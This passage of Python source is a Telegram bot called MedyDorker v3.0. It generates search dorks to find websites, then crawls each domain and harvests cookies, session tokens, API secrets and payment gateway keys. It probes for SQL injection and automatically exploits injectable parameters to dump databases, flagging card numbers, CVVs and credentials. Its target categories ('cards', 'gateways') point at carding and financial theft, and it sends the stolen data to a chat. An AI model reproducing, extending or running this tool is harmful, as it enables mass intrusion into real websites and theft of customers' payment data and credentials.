            for entry in b3_cookies[:20]:
                text += f"  <b>{entry.get('name', '?')}</b>: <code>{entry.get('value', '?')[:60]}</code>\n"
                text += f"  📍 {entry.get('url', '?')[:50]}\n\n"
        else:
            text += "🔵 B3 Cookies: None found yet\n\n"
        
        # ALL cookies grouped by domain
        all_cookies = p.db.get_all_cookies()
        if all_cookies:
            # Group by domain
            by_domain = {}
            for entry in all_cookies:
                url = entry.get('url', '?')
                try:
                    domain = urlparse(url).netloc or url[:40]
                except Exception:
                    domain = url[:40]
                by_domain.setdefault(domain, []).append(entry)
            
            text += f"🌐 <b>All Cookies by Domain ({len(all_cookies)} total, {len(by_domain)} domains):</b>\n\n"
            
            for domain, cookies in sorted(by_domain.items())[:30]:
                text += f"<b>📍 {domain}</b>\n"
                for c in cookies[:10]:
                    name = c.get('name', '?')
                    value = c.get('value', '?')
                    ctype = c.get('type', '')
                    tag = ""
                    if ctype == "session":
                        tag = " 🔐"
                    elif ctype == "auth":
                        tag = " 🔑"
                    elif ctype == "b3":
                        tag = " 🔵"
                    text += f"  <code>{name}={value[:50]}</code>{tag}\n"
                if len(cookies) > 10:
                    text += f"  ... +{len(cookies) - 10} more\n"
                text += "\n"
        else:
            text += "🌐 No cookies collected yet.\n\n"
        
        # Stats
        session_cookies = p.db.get_session_cookies()
        text += f"📊 <b>Summary:</b> {len(all_cookies)} total | {len(session_cookies)} session/auth | {len(b3_cookies)} b3\n"
    else:
        text += "Database not initialized.\n"
    
    # Also show in-memory scanner cookies
    if hasattr(p, 'sqli_scanner'):
        b3_mem = p.sqli_scanner.get_b3_cookies()
        if b3_mem:
            text += f"\n🔵 <b>B3 from Current Session ({len(b3_mem)}):</b>\n"
            for url, cookies in list(b3_mem.items())[:10]:
                text += f"  📍 {url[:50]}\n"
                for name, value in cookies.items():
                    text += f"    {name}: <code>{value[:40]}</code>\n"
    
    if len(text) > 4000:
        parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
        for part in parts:
            await update.message.reply_text(part, parse_mode="HTML")
    else:
        await update.message.reply_text(text, parse_mode="HTML")


async def cmd_dorkstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dorkstats command."""
    p = get_pipeline()
    gen_stats = p.generator.get_stats()
    
    text = (
        f"🔍 <b>Dork Generator Stats</b>\n"
        f"\n"
        f"<b>Patterns:</b> {gen_stats['patterns']}\n"
        f"<b>Static Dorks:</b> {gen_stats['static_dorks']}\n"
        f"\n"
        f"<b>Parameter Files:</b>\n"
    )
    for param, count in gen_stats["param_counts"].items():
        text += f"  {param}: {count} entries\n"
    
    text += (
        f"\n<b>Max Combinations:</b> {gen_stats['total_possible_combinations']:,}\n"
        f"<b>Categories:</b> {', '.join(gen_stats['categories'])}\n"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_sqlistats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /sqlistats command."""
    p = get_pipeline()
    
    text = (
        f"🔓 <b>SQLi Statistics</b>\n"
        f"\n"
        f"<b>Total Vulns Found:</b> {len(p.vulnerable_urls)}\n"
        f"\n"
    )
    
    if p.vulnerable_urls:
        text += "<b>Recent Vulnerabilities:</b>\n"
        for vuln in p.vulnerable_urls[-10:]:
            text += (
                f"\n<code>{vuln['url'][:60]}</code>\n"
                f"  Param: {vuln['param']} | Type: {vuln['type']} | DBMS: {vuln['dbms']}\n"
            )
    else:
        text += "No SQLi vulnerabilities found yet."
    
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_secrets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /secrets command."""
    p = get_pipeline()
    
    text = f"🔐 <b>Found Secrets</b> ({len(p.found_gateways)} gateways, {len(p.found_secrets)} other)\n\n"
    
    if p.found_gateways:
        text += "<b>🔑 Gateway Keys:</b>\n"
        for gw in p.found_gateways[-15:]:
            text += (
                f"  <b>{gw['type']}</b>\n"
                f"  <code>{gw['value']}</code>\n"
                f"  📍 {gw['url'][:50]}\n\n"
            )
    
    if p.found_secrets:
        text += "\n<b>🔐 Other Secrets:</b>\n"
        for sec in p.found_secrets[-10:]:
            text += (
                f"  <b>{sec['type']}</b>\n"
                f"  <code>{sec['value'][:60]}</code>\n\n"
            )
    
    if not p.found_gateways and not p.found_secrets:
        text += "No secrets found yet. Start pipeline with /dorkon"
    
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_dumps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dumps command."""
    p = get_pipeline()
    
    dump_dir = p.config.dumper_output_dir
    text = f"📦 <b>Data Dumps</b>\n\n"
    
    if os.path.exists(dump_dir):
        files = sorted(os.listdir(dump_dir), reverse=True)[:20]
        if files:
            for f in files:
                fpath = os.path.join(dump_dir, f)
                size = os.path.getsize(fpath)
                text += f"📁 <code>{f}</code> ({size:,} bytes)\n"
        else:
            text += "No dumps yet."
    else:
        text += "Dump directory not created yet."
    
    text += f"\n<b>Cards Found:</b> {len(p.found_cards)}"
    
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_categories(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /categories command."""
    text = (
        "🎯 <b>Available Categories</b>\n"
        "\n"
        "<b>Primary (Card/Gateway focus):</b>\n"
        "  💳 <code>cards</code> — Card numbers, CVVs, expiry dates\n"
        "  🔑 <code>gateways</code> — Stripe, Braintree, PayPal keys\n"
        "\n"
        "<b>Secondary:</b>\n"
        "  🔐 <code>secrets</code> — API keys, tokens, credentials\n"
        "  🔓 <code>sqli</code> — SQL injection targets\n"
        "  🗄️ <code>databases</code> — Exposed databases\n"
        "  ☁️ <code>cloud</code> — Cloud misconfigurations\n"
        "\n"
        "Use: /target &lt;category&gt;\n"
        "Example: /target cards"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /target <category> command."""
    p = get_pipeline()
    
    if not context.args:
        await update.message.reply_text("Usage: /target <category>\nSee /categories for options.")
        return
    
    category = context.args[0].lower()
    valid = ["cards", "gateways", "secrets", "sqli", "databases", "cloud"]
    
    if category not in valid:
        await update.message.reply_text(f"Invalid category. Valid: {', '.join(valid)}")
        return
    
    await update.message.reply_text(f"🎯 Starting targeted scan for: <b>{category}</b>", parse_mode="HTML")
    
    # Run in background
    async def targeted_task():
        dorks = p.generator.generate_targeted(category, max_count=500)
        was_running = p.running
        if not was_running:
            p.running = True
            p.set_telegram_context(context.bot, update.effective_chat.id)
        await p.run_dork_cycle(dorks=dorks, category=category)
        if not was_running:
            p.running = False
    
    asyncio.create_task(targeted_task())


async def cmd_stopscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stopscan command — cancel running scan/deepscan."""
    chat_id = update.effective_chat.id
    task = scan_tasks.get(chat_id)
    
    if task and not task.done():
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass
        scan_tasks.pop(chat_id, None)
        await update.message.reply_text("🛑 Scan cancelled.")
    else:
        await update.message.reply_text("No scan is currently running.")


async def cmd_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /scan <url> command — comprehensive deep scan. Runs as background task."""
    if not context.args:
        await update.message.reply_text("Usage: /scan <url>")
        return
    
    chat_id = update.effective_chat.id
    
    # Check if a scan is already running in this chat
    existing = scan_tasks.get(chat_id)
    if existing and not existing.done():
        await update.message.reply_text("⚠️ A scan is already running. Use /stopscan to cancel it first.")
        return
    
    url = context.args[0]
    if not url.startswith("http"):
        url = "https://" + url
    
    await update.message.reply_text(
        f"🔍 <b>Full Domain Scan Starting</b>\n"
        f"<code>{url}</code>\n\n"
        f"Phase 1: WAF + Cookies + Platform Detection\n"
        f"Phase 2: Secret Extraction (all pages)\n"
        f"Phase 3: Deep Crawl (discover all internal pages)\n"
        f"Phase 4: SQLi Testing (URL + Cookie + Header + POST)\n"
        f"Phase 5: Data Dumping (if injectable)\n\n"
        f"Use /stopscan to cancel.",
        parse_mode="HTML"
    )
    
    # Run the actual scan as a background task
    async def _run_scan():
        try:
            await _do_scan(update, url)
        except asyncio.CancelledError:
            await update.message.reply_text("🛑 Scan cancelled.")
        except Exception as e:
            logger.error(f"Scan task error: {e}")
            await update.message.reply_text(f"❌ Scan error: {str(e)[:200]}")
        finally:
            scan_tasks.pop(chat_id, None)
    
    task = asyncio.create_task(_run_scan())
    scan_tasks[chat_id] = task


async def _do_scan(update: Update, url: str):
    """Comprehensive domain scanner — crawls the entire domain, scans everything."""
    p = get_pipeline()
    
    import aiohttp
    from urllib.parse import urlparse as _urlparse, urljoin, parse_qs, urlunparse
    from bs4 import BeautifulSoup
    
    parsed = _urlparse(url)
    base_domain = parsed.netloc
    base_url = f"{parsed.scheme}://{base_domain}"
    waf_result = None
    waf_name = None
    
    # Collect everything across all pages
    all_cookies = {}           # name -> {value, type}
    all_b3_cookies = {}        # name -> value
    all_cookie_domains = {}    # domain -> {name: value}
    all_secrets = []
    all_sqli_results = []
    all_dump_results = []
    all_endpoints = {}
    platform_info = {}
    pages_scanned = 0
    pages_crawled = set()      # URLs we've already visited
    sqli_tested = 0
    
    timeout = aiohttp.ClientTimeout(total=30)
    async with aiohttp.ClientSession(
        timeout=timeout,
        cookie_jar=aiohttp.CookieJar(unsafe=True),
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
    ) as session:
        
        # ═══════ PHASE 1: WAF + Cookies + Tech Detection ═══════
        await update.message.reply_text("⏳ Phase 1: WAF Detection + Cookie Extraction...", parse_mode="HTML")
        
        if p.config.waf_detection_enabled:
            try:
                waf_info = await p.waf_detector.detect(url, session)
                waf_name = waf_info.waf
                waf_result = {
                    "name": waf_info.waf,
                    "cdn": waf_info.cdn,
                    "bot_protection": waf_info.bot_protection,
                    "risk": waf_info.risk_level,
                    "cms": waf_info.cms,
                }
            except Exception as e:
                logger.debug(f"WAF detection error: {e}")
        
        # Cookie extraction on main page
        if p.config.cookie_extraction_enabled:
            try:
                jar = await p.sqli_scanner.extract_cookies(url, session)
                if jar.cookies:
                    for name, value in jar.cookies.items():
                        all_cookies[name] = value
                        p.db.add_cookie(url, name, value, "auto")
                    for name, value in jar.b3_cookies.items():
                        all_b3_cookies[name] = value
                        p.db.add_b3_cookie(url, name, value)
                    all_cookie_domains[base_domain] = dict(jar.cookies)
            except Exception as e:
                logger.debug(f"Cookie extraction error: {e}")
        
        # ═══════ PHASE 2: Secret Extraction (deep — discovers pages + endpoints) ═══════
        await update.message.reply_text("⏳ Phase 2: Deep Secret Extraction + Endpoint Discovery...", parse_mode="HTML")
        
        try:
            scan_result = await p.secret_extractor.deep_extract_site(url, session)
            all_secrets = scan_result.get("secrets", [])
            platform_info = scan_result.get("platform", {})
            all_endpoints = scan_result.get("endpoints", {})
            sqli_candidates = scan_result.get("sqli_candidates", [])
            pages_scanned = scan_result.get("pages_scanned", 0)
        except Exception as e:
            logger.error(f"Secret extraction error: {e}")
            sqli_candidates = []
        
        # ═══════ PHASE 3: Deep Crawl — find ALL internal pages ═══════
        await update.message.reply_text(
            f"⏳ Phase 3: Deep Crawling Domain <code>{base_domain}</code>...\n"
            f"(Already found {pages_scanned} pages + {len(sqli_candidates)} SQLi targets)",
            parse_mode="HTML"
        )
        
        # Start with the main URL and crawl outwards
        crawl_queue = [url]
        discovered_param_urls = set()   # URLs with query params (SQLi targets)
        discovered_all_urls = set()     # All internal URLs
        max_crawl_pages = 100
        
        # Add param URLs from secret extractor
        for candidate in sqli_candidates:
            discovered_param_urls.add(candidate['url'])
        
        # Add endpoints from secret extractor  
        for key, eps in all_endpoints.items():
            if isinstance(eps, list):
                for ep in eps:
                    if isinstance(ep, str) and ep.startswith("http"):
                        if _urlparse(ep).netloc == base_domain:
                            discovered_all_urls.add(ep)
                            if "?" in ep:
                                discovered_param_urls.add(ep)
        
        crawl_count = 0
        while crawl_queue and crawl_count < max_crawl_pages:
            current_url = crawl_queue.pop(0)
            
            if current_url in pages_crawled:
                continue
            pages_crawled.add(current_url)
            crawl_count += 1
            
            try:
                async with session.get(current_url, ssl=False, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    if resp.status != 200:
                        continue
                    
                    ct = resp.headers.get("Content-Type", "")
                    if "text/html" not in ct and "application/xhtml" not in ct:
                        continue
                    
                    html_text = await resp.text(errors="ignore")
                    
                    # Extract cookies from each page too
                    if p.config.cookie_extraction_enabled:
                        resp_cookies = resp.cookies
                        for name, cookie in resp_cookies.items():
                            val = cookie.value
                            if val and name not in all_cookies:
                                all_cookies[name] = val
                                p.db.add_cookie(current_url, name, val, "crawl")
                                # Check for b3
                                b3_names = {"x-b3-traceid", "x-b3-spanid", "x-b3-parentspanid", 
                                           "x-b3-sampled", "x-b3-flags", "b3"}
                                if name.lower() in b3_names:
                                    all_b3_cookies[name] = val
                                    p.db.add_b3_cookie(current_url, name, val)
                    
                    # Parse all links
                    soup = BeautifulSoup(html_text, "html.parser")
                    
                    # <a href>
                    for tag in soup.find_all(["a", "area"], href=True):
                        href = tag["href"]
                        full = urljoin(current_url, href)
                        p_full = _urlparse(full)
                        if p_full.netloc != base_domain:
                            continue
                        # Clean fragment
                        clean = urlunparse((p_full.scheme, p_full.netloc, p_full.path, 
                                          p_full.params, p_full.query, ""))
                        if clean not in pages_crawled and clean not in discovered_all_urls:
                            discovered_all_urls.add(clean)
                            crawl_queue.append(clean)
                            if p_full.query:
                                discovered_param_urls.add(clean)
                    
                    # <form action>
                    for form in soup.find_all("form", action=True):
                        action = urljoin(current_url, form["action"])
                        p_act = _urlparse(action)
                        if p_act.netloc == base_domain or not p_act.netloc:
                            discovered_all_urls.add(action)
                            # Collect form inputs as potential POST SQLi targets
                            inputs = []
                            for inp in form.find_all(["input", "select", "textarea"]):
                                name = inp.get("name")
                                if name:
                                    inputs.append(name)
                            if inputs:
                                discovered_param_urls.add(action)
                    
                    # <script src> — look for API/config JS
                    for script in soup.find_all("script", src=True):
                        src = urljoin(current_url, script["src"])
                        p_src = _urlparse(src)
                        if p_src.netloc == base_domain:
                            discovered_all_urls.add(src)
                    
                    # iframe src
                    for iframe in soup.find_all("iframe", src=True):
                        isrc = urljoin(current_url, iframe["src"])
                        p_iframe = _urlparse(isrc)
                        if p_iframe.netloc == base_domain:
                            discovered_all_urls.add(isrc)
                            if p_iframe.query:
                                discovered_param_urls.add(isrc)
                    
            except asyncio.TimeoutError:
                continue
            except Exception:
                continue
            
            # Progress every 20 pages
            if crawl_count % 20 == 0:
                await update.message.reply_text(
                    f"🕸️ Crawled {crawl_count} pages | Found {len(discovered_param_urls)} param URLs | "
                    f"Queue: {len(crawl_queue)} | Cookies: {len(all_cookies)}",
                    parse_mode="HTML"
                )
        
        total_pages_found = len(pages_crawled)
        
        await update.message.reply_text(
            f"✅ Crawl complete: <b>{total_pages_found}</b> pages | "
            f"<b>{len(discovered_param_urls)}</b> param URLs | "
            f"<b>{len(all_cookies)}</b> cookies",
            parse_mode="HTML"
        )
        
        # ═══════ PHASE 4: SQLi Testing — all param URLs + cookies + headers + POST ═══════
        # Merge discovered param URLs with sqli_candidates
        all_sqli_targets = set()
        for candidate in sqli_candidates:
            all_sqli_targets.add(candidate['url'])
        all_sqli_targets.update(discovered_param_urls)
        
        # Sort by priority (id, cat, pid params first)
        def _sqli_priority(u):
            qs = _urlparse(u).query.lower()
            score = 0
            high_params = ['id', 'cat', 'pid', 'item', 'product', 'page', 'article', 'news',
                          'view', 'category', 'show', 'select', 'report', 'action']
            for hp in high_params:
                if f"{hp}=" in qs:
                    score += 10
            if "search" in qs or "query" in qs or "q=" in qs:
                score += 6
            return score
        
        sorted_targets = sorted(all_sqli_targets, key=_sqli_priority, reverse=True)
        max_sqli_test = 50  # Test up to 50 URLs
        targets_to_test = sorted_targets[:max_sqli_test]
        
        if targets_to_test:
            await update.message.reply_text(
                f"⏳ Phase 4: SQLi Testing <b>{len(targets_to_test)}</b> endpoints "
                f"(URL + Cookie + Header + POST injection)...\n"
                f"WAF: {waf_name or 'None detected'}",
                parse_mode="HTML"
            )
            
            for idx, target_url in enumerate(targets_to_test):
                try:
                    # Extract cookies for this specific URL too
                    if p.config.cookie_extraction_enabled and target_url not in [url]:
                        try:
                            tjar = await p.sqli_scanner.extract_cookies(target_url, session)
                            if tjar.cookies:
                                for name, value in tjar.cookies.items():
                                    if name not in all_cookies:
                                        all_cookies[name] = value
                                        p.db.add_cookie(target_url, name, value, "sqli_scan")
                                for name, value in tjar.b3_cookies.items():
                                    if name not in all_b3_cookies:
                                        all_b3_cookies[name] = value
                                        p.db.add_b3_cookie(target_url, name, value)
                        except Exception:
                            pass
                    
                    results = await p.sqli_scanner.scan(target_url, session, waf_name=waf_name)
                    sqli_tested += 1
                    
                    if results:
                        for r in results:
                            all_sqli_results.append({
                                "url": r.url,
                                "param": r.parameter,
                                "technique": r.technique,
                                "injection_type": r.injection_type,
                                "injection_point": getattr(r, 'injection_point', 'url'),
                                "dbms": r.dbms or "Unknown",
                                "column_count": r.column_count,
                                "db_version": r.db_version,
                                "current_db": r.current_db,
                                "current_user": r.current_user,
                            })
                            
                            # Track
                            p.vulnerable_urls.append({
                                "url": r.url,
                                "param": r.parameter,
                                "type": r.injection_type,
                                "dbms": r.dbms,
                                "injection_point": getattr(r, 'injection_point', 'url'),
                                "time": datetime.now().isoformat(),
                            })
                            p.db.add_vulnerable_url({
                                "url": r.url, "param": r.parameter,
                                "type": r.injection_type, "dbms": r.dbms,
                                "injection_point": getattr(r, 'injection_point', 'url'),
                                "time": datetime.now().isoformat(),
                            })
                            
                            # Report 
                            await p.reporter.report_sqli_vuln(
                                r.url, r.parameter, r.dbms or "Unknown",
                                r.injection_type,
                                {
                                    "db_version": r.db_version,
                                    "current_db": r.current_db,
                                    "column_count": r.column_count,
                                    "injection_point": getattr(r, 'injection_point', 'url'),
                                    "source": "/scan",
                                }
                            )
                            
                            # ═══════ PHASE 5: Exploit + Dump ═══════
                            if p.config.dumper_enabled and r.injection_type in ("union", "error"):
                                await update.message.reply_text(
                                    f"💉 <b>Injectable!</b> Exploiting {r.injection_type}-based SQLi\n"
                                    f"Param: <code>{r.parameter}</code> ({getattr(r, 'injection_point', 'url')})\n"
                                    f"DBMS: {r.dbms or 'Unknown'} | Columns: {r.column_count}\n"
                                    f"Dumping tables & data...",
                                    parse_mode="HTML"
                                )
                                
                                try:
                                    dump = await p.dumper.targeted_dump(r, session)
                                    
                                    if dump.has_valuable_data or dump.total_rows > 0:
                                        saved = p.dumper.save_dump(dump)
                                        
                                        dump_info = {
                                            "url": r.url, "param": r.parameter,
                                            "dbms": dump.dbms, "database": dump.database,
                                            "tables": len(dump.tables),
                                            "total_rows": dump.total_rows,
                                            "cards": len(dump.card_data),
                                            "credentials": len(dump.credentials),
                                            "gateway_keys": len(dump.gateway_keys),
                                            "files": saved,
                                        }
                                        all_dump_results.append(dump_info)
                                        
                                        await p.reporter.report_data_dump(
                                            r.url, dump.dbms, dump.database,
                                            dump.tables,
                                            {t: len(rows) for t, rows in dump.data.items()},
                                            saved,
                                        )
                                        
                                        if dump.card_data:
                                            p.found_cards.extend(dump.card_data)
                                            for card in dump.card_data:
                                                p.db.add_card_data(r.url, card)
                                            await p.reporter.report_card_data(r.url, dump.card_data)
                                        
                                        if dump.credentials:
                                            for cred in dump.credentials:
                                                p.found_secrets.append({
                                                    "url": r.url, "type": "db_credential",
                                                    "value": str(cred), "source": "sqli_dump",
                                                    "time": datetime.now().isoformat(),
                                                })
                                        
                                        if dump.gateway_keys:
                                            for key_entry in dump.gateway_keys:
                                                for col, val in key_entry.items():
                                                    p.found_gateways.append({
                                                        "url": r.url, "type": f"db_{col}",
                                                        "value": val, "source": "sqli_dump",
                                                        "time": datetime.now().isoformat(),
                                                    })
                                                    p.db.add_gateway_key(r.url, f"db_{col}", val, source="sqli_dump")
                                                    await p.reporter.report_gateway(
                                                        r.url, f"DB: {col}", val,
                                                        {"source": "SQL injection dump via /scan"}
                                                    )
                                        
                                        dump_text = (
                                            f"📦 <b>Data Dump Successful!</b>\n"
                                            f"DB: {dump.database or 'N/A'} ({dump.dbms})\n"
                                            f"Tables: {len(dump.tables)} | Rows: {dump.total_rows}\n"
                                        )
                                        if dump.card_data:
                                            dump_text += f"💳 <b>Card Data: {len(dump.card_data)} entries</b>\n"
                                        if dump.credentials:
                                            dump_text += f"🔐 Credentials: {len(dump.credentials)}\n"
                                        if dump.gateway_keys:
                                            dump_text += f"🔑 Gateway Keys: {len(dump.gateway_keys)}\n"
                                        if dump.raw_dumps:
                                            dump_text += f"📄 DIOS Dumps: {len(dump.raw_dumps)}\n"
                                        await update.message.reply_text(dump_text, parse_mode="HTML")
                                    else:
                                        all_dump_results.append({
                                            "url": r.url, "param": r.parameter,
                                            "dbms": dump.dbms, "tables": len(dump.tables),
                                            "total_rows": dump.total_rows,
                                            "cards": 0, "credentials": 0, "gateway_keys": 0,
                                        })
                                
                                except Exception as dump_err:
                                    logger.error(f"Dump error: {dump_err}")
                                    await update.message.reply_text(
                                        f"⚠️ Injection confirmed but dump failed: {str(dump_err)[:100]}",
                                        parse_mode="HTML"
                                    )
                    
                    # Progress every 10 targets
                    if (idx + 1) % 10 == 0:
                        await update.message.reply_text(
                            f"🔓 SQLi progress: {idx+1}/{len(targets_to_test)} tested | "
                            f"Found: {len(all_sqli_results)} vulns",
                            parse_mode="HTML"
                        )
                    
                except Exception:
                    continue
        
        # Save state
        p._save_state()
    
    # Report gateway secrets  
    for secret in all_secrets:
        if secret.category == "gateway":
            p.found_gateways.append({
                "url": secret.url, "type": secret.type,
                "value": secret.value, "time": datetime.now().isoformat(),
            })
            p.db.add_gateway_key(secret.url, secret.type, secret.value,
                                source="scan_command", confidence=secret.confidence)
            await p.reporter.report_gateway(
                secret.url, secret.type, secret.value,
                {"confidence": secret.confidence}
            )
    
    # ═══════ BUILD FINAL REPORT ═══════
    text = f"━━━━━━━━━━━━━━━━━━━━\n🔍 <b>Full Domain Scan Report</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    text += f"🌐 Target: <code>{url}</code>\n"
    text += f"📄 Pages Crawled: {total_pages_found}\n"
    text += f"🔗 Param URLs Found: {len(discovered_param_urls)}\n"
    text += f"🔓 SQLi Endpoints Tested: {sqli_tested}\n\n"
    
    # ── Cookies (ALL of them) ──
    text += f"<b>🍪 Cookies ({len(all_cookies)}):</b>\n"
    if all_cookies:
        for name, value in sorted(all_cookies.items()):
            tag = ""
            nl = name.lower()
            b3_names = {"x-b3-traceid", "x-b3-spanid", "x-b3-parentspanid", "x-b3-sampled", "x-b3-flags", "b3"}
            sess_patterns = ["sessid", "session", "phpsessid", "jsessionid", "asp.net", "connect.sid"]
            auth_patterns = ["token", "auth", "jwt", "csrf", "xsrf", "login"]
            if nl in b3_names:
                tag = " 🔵"
            elif any(p in nl for p in sess_patterns):
                tag = " 🔐"
            elif any(p in nl for p in auth_patterns):
                tag = " 🔑"
            text += f"  <code>{name}={value[:50]}</code>{tag}\n"
    else:
        text += "  None found\n"
    
    if all_b3_cookies:
        text += f"\n  🔵 <b>B3 Tracing: {len(all_b3_cookies)}</b>\n"
        for name, value in all_b3_cookies.items():
            text += f"    <code>{name}={value}</code>\n"
    text += "\n"
    
    # ── Platform ──
    if platform_info:
        if platform_info.get('platform'):
            text += f"<b>Platform:</b> {platform_info['platform']}\n"
        if platform_info.get('gateways'):
            text += f"<b>Gateways:</b> {', '.join(platform_info['gateways'])}\n"
        else:
            text += f"<b>Gateways:</b> ❌ None detected\n"
        if platform_info.get('form_type'):
            text += f"<b>Form Type:</b> {platform_info['form_type']}\n"
        text += f"AJAX: {'✅' if platform_info.get('has_ajax') else '❌'} | "
        text += f"Nonce: {'✅' if platform_info.get('has_nonce') else '❌'} | "
        text += f"Captcha: {'⚠️' if platform_info.get('has_captcha') else '✅ None'}\n\n"
    
    # ── WAF ──
    if waf_result:
        text += f"<b>🛡 Protection:</b>\n"
        parts = []
        if waf_result.get("name"):
            parts.append(f"WAF: {waf_result['name']}")
        if waf_result.get("cdn"):
            parts.append(f"CDN: {waf_result['cdn']}")
        if waf_result.get("bot_protection"):
            parts.append(f"Bot: {waf_result['bot_protection']}")
        if waf_result.get("cms"):
            parts.append(f"CMS: {waf_result['cms']}")
        text += "  " + " | ".join(parts) if parts else "  None"
        text += "\n\n"
    
    # ── Secrets ──
    if all_secrets:
        gateway_secrets = [s for s in all_secrets if s.category == "gateway"]
        other_secrets = [s for s in all_secrets if s.category != "gateway"]
        
        if gateway_secrets:
            text += f"<b>🔑 Gateway Keys ({len(gateway_secrets)}):</b>\n"
            for s in gateway_secrets:
                text += f"  <b>{s.key_name}</b>\n"
                text += f"  <code>{s.value[:80]}</code>\n"
                text += f"  📍 {s.url}\n\n"
        
        if other_secrets:
            text += f"<b>🔐 Other Secrets ({len(other_secrets)}):</b>\n"
            for s in other_secrets[:15]:
                text += f"  <b>{s.key_name}</b>: <code>{s.value[:50]}</code>\n"
            if len(other_secrets) > 15:
                text += f"  ... +{len(other_secrets) - 15} more\n"
            text += "\n"
    else:
        text += "🔐 No secrets/keys found.\n\n"
    
    # ── Endpoints ──
    total_endpoints = sum(len(v) for v in all_endpoints.values() if isinstance(v, list))
    if total_endpoints > 0:
        text += f"<b>🌐 Endpoints ({total_endpoints}):</b>\n"
        ep_labels = {
            "ajax_endpoints": "⚡ AJAX", "rest_api": "🔗 REST",
            "form_actions": "📝 Forms", "login_pages": "🔐 Login",
            "search_endpoints": "🔎 Search", "param_urls": "❓ Params",
            "file_upload": "📤 Upload", "admin_pages": "👤 Admin",
            "api_calls": "🌍 ExtAPI", "interesting_js": "📜 JS",
        }
        for key, label in ep_labels.items():
            eps = all_endpoints.get(key, [])
            if eps:
                text += f"  {label}: {len(eps)}\n"
        text += "\n"
    
    # ── SQLi ──
    if all_sqli_results:
        text += f"<b>🔓 SQL Injection ({len(all_sqli_results)}):</b>\n"
        for r in all_sqli_results:
            text += f"  ⚠️ <b>{r['technique']}</b> ({r['injection_type']}) via {r.get('injection_point', 'url')}\n"
            text += f"     Param: <code>{r['param']}</code> | DBMS: {r['dbms']}\n"
            if r.get('db_version'):
                text += f"     Version: {r['db_version']}\n"
            if r.get('current_db'):
                text += f"     DB: {r['current_db']}\n"
            text += f"     <code>{r['url'][:70]}</code>\n\n"
    elif sqli_tested > 0:
        text += f"🔓 Tested {sqli_tested} endpoints — none injectable\n\n"
    else:
        text += f"🔓 No testable endpoints found\n\n"
    
    # ── Dumps ──
    if all_dump_results:
        text += f"<b>📦 Data Dumps ({len(all_dump_results)}):</b>\n"
        for d in all_dump_results:
            text += f"  DB: {d.get('database', '?')} ({d.get('dbms', '?')})\n"
            text += f"  Tables: {d.get('tables', 0)} | Rows: {d.get('total_rows', 0)}\n"
            if d.get('cards', 0) > 0:
                text += f"  💳 Cards: {d['cards']}\n"
            if d.get('credentials', 0) > 0:
                text += f"  🔐 Credentials: {d['credentials']}\n"
            if d.get('gateway_keys', 0) > 0:
                text += f"  🔑 Gateway Keys: {d['gateway_keys']}\n"
            text += "\n"
    
    text += "━━━━━━━━━━━━━━━━━━━━"
    
    # Split for Telegram limit
    if len(text) > 4000:
        parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
        for part in parts:
            await update.message.reply_text(part, parse_mode="HTML")
    else:
        await update.message.reply_text(text, parse_mode="HTML")


async def cmd_deepscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /deepscan — alias for /scan (full domain scan)."""
    await cmd_scan(update, context)


# ==================== ENTRY POINT ====================

def main():
    """Main entry point."""
    config = DorkerConfig()
    
    if not config.telegram_bot_token:
        logger.error("No bot token configured! Set DORKER_BOT_TOKEN or update config_v3.py")
        sys.exit(1)
    
    if not HAS_PTB:
        logger.warning("python-telegram-bot not installed, running pipeline without bot interface")
        # Run pipeline directly
        global pipeline
        pipeline = MedyDorkerPipeline(config)
        asyncio.run(pipeline.start())
        return
    
    logger.info("Starting MedyDorker v3.0 Telegram Bot...")
    
    app = Application.builder().token(config.telegram_bot_token).build()
    
    # Register handlers (work in both DM and group chats)
    chat_filter = filters.ChatType.PRIVATE | filters.ChatType.GROUP | filters.ChatType.SUPERGROUP
    
    app.add_handler(CommandHandler("start", cmd_start, filters=chat_filter))
    app.add_handler(CommandHandler("help", cmd_start, filters=chat_filter))
    app.add_handler(CommandHandler("dorkon", cmd_dorkon, filters=chat_filter))
    app.add_handler(CommandHandler("dorkoff", cmd_dorkoff, filters=chat_filter))
    app.add_handler(CommandHandler("stopscan", cmd_stopscan, filters=chat_filter))
    app.add_handler(CommandHandler("status", cmd_status, filters=chat_filter))
    app.add_handler(CommandHandler("dorkstats", cmd_dorkstats, filters=chat_filter))
    app.add_handler(CommandHandler("sqlistats", cmd_sqlistats, filters=chat_filter))
    app.add_handler(CommandHandler("secrets", cmd_secrets, filters=chat_filter))
    app.add_handler(CommandHandler("dumps", cmd_dumps, filters=chat_filter))
    app.add_handler(CommandHandler("categories", cmd_categories, filters=chat_filter))
    app.add_handler(CommandHandler("target", cmd_target, filters=chat_filter))
    app.add_handler(CommandHandler("scan", cmd_scan, filters=chat_filter))
    app.add_handler(CommandHandler("deepscan", cmd_deepscan, filters=chat_filter))
    app.add_handler(CommandHandler("cookies", cmd_cookies, filters=chat_filter))
    
    logger.info("Bot handlers registered, starting polling...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
